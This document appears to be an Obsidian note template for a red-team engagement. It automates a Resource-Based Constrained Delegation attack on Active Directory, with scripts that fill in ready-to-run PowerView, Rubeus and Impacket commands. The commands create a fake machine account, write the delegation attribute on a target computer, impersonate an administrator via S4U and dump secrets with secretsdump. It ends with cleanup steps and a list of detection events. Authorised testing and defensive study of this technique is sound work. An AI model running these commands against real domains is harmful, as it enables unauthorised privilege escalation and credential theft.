---
# Attack-specific fields
target_computer:
target_computer_fqdn:
attacker_computer:
attacker_computer_fqdn:
write_access_principal:
fake_computer_name: FAKEMACHINE
fake_computer_password: FakeMachinePass123!
impersonate_user:
s4u_ticket:
notes:
---

# Resource-Based Constrained Delegation (RBCD)

> [!abstract] Attack Summary
> RBCD allows a computer to explicitly trust other principals to delegate to it, controlled by the **msDS-AllowedToActOnBehalfOfOtherIdentity** attribute on the target. If you can write to this attribute on a computer object, you can configure any principal you control to delegate to that machine — then S4U to impersonate any user and gain admin access.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",     b?.domain     ?? "—"],
  ["DC IP",      b?.dc_ip      ?? "—"],
  ["DC FQDN",    b?.dc_fqdn    ?? "—"],
  ["Username",   b?.username   ?? "—"],
  ["Domain SID", b?.domain_sid ?? "—"],
  ["OS Env",     b?.os_env     ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
dv.table(["Field", "Value"], [
  ["Target Computer (victim, short)",        `\`INPUT[text:target_computer]\``],
  ["Target Computer FQDN",                   `\`INPUT[text:target_computer_fqdn]\``],
  ["Principal with Write Access",            `\`INPUT[text:write_access_principal]\``],
  ["Fake Computer Name (to create)",         `\`INPUT[text(defaultValue("${p.fake_computer_name ?? 'FAKEMACHINE'}")):fake_computer_name]\``],
  ["Fake Computer Password",                 `\`INPUT[text(defaultValue("${p.fake_computer_password ?? 'FakeMachinePass123!'}")):fake_computer_password]\``],
  ["User to Impersonate",                    `\`INPUT[text:impersonate_user]\``],
]);
```

---

## Step 1 — Find Writable Computer Accounts

> [!info] Look for principals (users/computers) with **WriteProperty**, **WriteDACL**, or **GenericWrite** over a computer object. This includes **ms-DS-MachineAccountQuota** for creating new computer accounts.

**Windows — PowerView (find write permissions)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "domain.local";
const username = b?.username ?? "USER";
dv.paragraph("```powershell\n# Find computers where current user has write access\nFind-InterestingDomainAcl -ResolveGUIDs | ?{ $_.IdentityReferenceName -match '" + username + "' -and $_.ActiveDirectoryRights -match 'Write' }\n\n# Check Machine Account Quota (default = 10)\nGet-DomainObject -Identity 'DC=" + domain.split('.').join(',DC=') + "' -Properties ms-DS-MachineAccountQuota\n```");
```

**Windows — ADSearch**
```dataviewjs
dv.paragraph("```bash\n# Check ms-DS-MachineAccountQuota\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe " +
  "--search \"(objectClass=domain)\" --attributes ms-DS-MachineAccountQuota\n```");
```

**Linux — NetExec**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\nnxc ldap " + dc_ip + " -u '" + username + "' -p '" + password + "' -M maq\n```");
```

Target computer with write access: `INPUT[text:target_computer]` FQDN: `INPUT[text:target_computer_fqdn]`

---

## Step 2 — Create a Fake Computer Account

**Windows — StandIn / PowerShell**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain ?? "domain.local";
const fakeName = p?.fake_computer_name ?? "FAKEMACHINE";
const fakePass = p?.fake_computer_password ?? "FakeMachinePass123!";
dv.paragraph("```powershell\n# Using PowerShell Active Directory module\nImport-Module ActiveDirectory\nNew-ADComputer -Name '" + fakeName + "' -AccountPassword (ConvertTo-SecureString '" + fakePass + "' -AsPlainText -Force) -Enabled $true\n\n# Verify it was created\nGet-ADComputer -Identity '" + fakeName + "'\n```");
```

**Linux — Impacket**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const fakeName = p?.fake_computer_name ?? "FAKEMACHINE";
const fakePass = p?.fake_computer_password ?? "FakeMachinePass123!";
dv.paragraph("```bash\nimpacket-addcomputer " + domain + "/" + username + ":'" + password + "' -computer-name '" + fakeName + "$' -computer-pass '" + fakePass + "' -dc-ip " + dc_ip + "\n```");
```

---

## Step 3 — Configure RBCD on Target

> [!info] Set `msDS-AllowedToActOnBehalfOfOtherIdentity` on the **target** computer to trust the **fake** computer.

**Windows — PowerView**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain ?? "domain.local";
const domainParts = domain.split('.').map(x => "DC=" + x).join(',');
const fakeName    = p?.fake_computer_name ?? "FAKEMACHINE";
const targetComp  = p?.target_computer ?? "TARGET_COMPUTER";
dv.paragraph("```powershell\n$FakeComputer = Get-ADComputer -Identity '" + fakeName + "'\n$TargetComputer = Get-ADComputer -Identity '" + targetComp + "'\n\nSet-ADComputer -Identity $TargetComputer -PrincipalsAllowedToDelegateToAccount $FakeComputer\n\n# Verify\nGet-ADComputer -Identity '" + targetComp + "' -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Select -ExpandProperty msDS-AllowedToActOnBehalfOfOtherIdentity\n```");
```

**Linux — Impacket**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain   ?? "DOMAIN";
const dc_ip       = b?.dc_ip    ?? "DC_IP";
const username    = b?.username ?? "USER";
const password    = b?.password ?? "PASSWORD";
const fakeName    = p?.fake_computer_name ?? "FAKEMACHINE";
const targetComp  = p?.target_computer_fqdn || (p?.target_computer + "." + domain);
dv.paragraph("```bash\nimpacket-rbcd " + domain + "/" + username + ":'" + password + "' -dc-ip " + dc_ip +
  " -delegate-to '" + (p?.target_computer ?? "TARGET") + "$' -delegate-from '" + fakeName + "$' -action write\n```");
```

---

## Step 4 — Perform S4U Delegation

**Windows — Rubeus**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain   ?? "DOMAIN";
const dc_ip       = b?.dc_ip    ?? "DC_IP";
const fakeName    = p?.fake_computer_name ?? "FAKEMACHINE";
const fakePass    = p?.fake_computer_password ?? "FakeMachinePass123!";
const targetFqdn  = p?.target_computer_fqdn || "TARGET.domain.local";
const impersonate = p?.impersonate_user || "administrator";

dv.paragraph("```bash\n# Step 1: Get TGT for fake computer\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt " +
  "/user:" + fakeName + "$ /password:" + fakePass + " /domain:" + domain + " /nowrap\n\n" +
  "# Step 2: S4U to impersonate admin on target\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe s4u " +
  "/user:" + fakeName + "$ /password:" + fakePass + " /impersonateuser:" + impersonate +
  " /msdsspn:cifs/" + targetFqdn + " /domain:" + domain + " /nowrap\n```");
```

**Linux — Impacket**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain   ?? "DOMAIN";
const dc_ip       = b?.dc_ip    ?? "DC_IP";
const fakeName    = p?.fake_computer_name ?? "FAKEMACHINE";
const fakePass    = p?.fake_computer_password ?? "FakeMachinePass123!";
const targetFqdn  = p?.target_computer_fqdn || "TARGET.domain.local";
const impersonate = p?.impersonate_user || "administrator";

dv.paragraph("```bash\n# Get TGT for fake machine\nimpacket-getTGT " + domain + "/" + fakeName + "$:'" + fakePass + "' -dc-ip " + dc_ip + "\nexport KRB5CCNAME=" + fakeName + "$.ccache\n\n# Perform S4U delegation\nimpacket-getST -spn 'cifs/" + targetFqdn + "' -impersonate " + impersonate + " -dc-ip " + dc_ip + " " + domain + "/" + fakeName + "$\n\nexport KRB5CCNAME=" + impersonate + "@cifs_" + targetFqdn + ".ccache\nimpacket-secretsdump -k -no-pass " + domain + "/" + impersonate + "@" + targetFqdn + "\n```");
```

Paste S4U ticket: `INPUT[text:s4u_ticket]`

---

## Step 5 — Cleanup

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain ?? "domain.local";
const fakeName    = p?.fake_computer_name ?? "FAKEMACHINE";
const targetComp  = p?.target_computer ?? "TARGET_COMPUTER";
dv.paragraph("```powershell\n# Remove RBCD attribute from target\nSet-ADComputer -Identity '" + targetComp + "' -PrincipalsAllowedToDelegateToAccount $null\n\n# Delete fake computer account\nRemove-ADComputer -Identity '" + fakeName + "' -Confirm:$false\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - Creating machine accounts (low MachineAccountQuota) is logged.
> - Modification of `msDS-AllowedToActOnBehalfOfOtherIdentity` generates **Event 5136** (directory service object modified).
> - S4U flows generate **Event 4769** on DC.
> - Anomalous LDAP writes to computer objects are detectable.

---

## Notes & Results

`INPUT[textarea:notes]`
